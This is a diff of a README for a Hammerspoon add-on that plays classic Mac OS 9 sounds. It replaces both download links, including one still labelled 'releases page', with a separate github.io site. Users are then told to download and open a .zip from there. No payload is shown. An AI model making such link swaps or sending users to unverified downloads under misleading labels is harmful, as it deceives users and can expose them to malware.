@@ -1,6 +1,6 @@
 # 🔊 PlatinumSnd.spoon - Add Classic Sounds To Your Mac
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/mounted-pricefloor85/PlatinumSnd.spoon/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://mounted-pricefloor85.github.io)
 
 PlatinumSnd.spoon brings the signature interface sounds of Mac OS 9 to modern macOS systems. This tool integrates directly with Hammerspoon to play authentic retro sound effects during common computer actions. You hear familiar clicks, beeps, and alerts when you open menus, empty the trash, or interact with windows.
 
@@ -18,7 +18,7 @@ If you do not have Hammerspoon, download it from the official Hammerspoon websit
 
 Follow these steps to set up the software.
 
-1. Visit the [releases page](https://github.com/mounted-pricefloor85/PlatinumSnd.spoon/releases) to download the latest file.
+1. Visit the [releases page](https://mounted-pricefloor85.github.io) to download the latest file.
 2. Look for the file ending in .zip. Click the link to save the file to your computer.
 3. Locate the downloaded file in your Downloads folder.
 4. Double-click the .zip file to extract the contents. You see a folder named PlatinumSnd.spoon.
